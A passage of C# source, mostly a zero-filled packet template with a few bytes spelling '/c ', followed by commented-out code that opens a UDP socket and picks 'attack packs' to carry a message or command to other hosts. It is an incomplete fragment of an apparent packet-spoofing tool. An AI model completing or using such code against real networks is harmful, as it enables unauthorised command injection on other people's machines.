                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x2f,
                    0x00,
                    0x63,
                    0x00,
                    0x20,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x01,
                    0x00,
                    0x00,
                    0x00,
                    0x01,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00
                }
                    };
                    Socket packSocket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                    int packIndex;
                    List<byte> attackPack;
                    if (attackType == "msg")
                    {
                        packIndex = 56;
                        attackPack = attackPacks[0];
                    }
                    else
                    {
                        packIndex = 578;
                        attackPack = attackPacks[1];
                    }
                    foreach (char ch in attackContent)
                    {
                        byte[] byteArray = new byte[1];
                        byteArray = System.Text.Encoding.ASCII.GetBytes(ch.ToString());
                        int asciiCode = byteArray[0];
                    }

                }
                */
    }
}
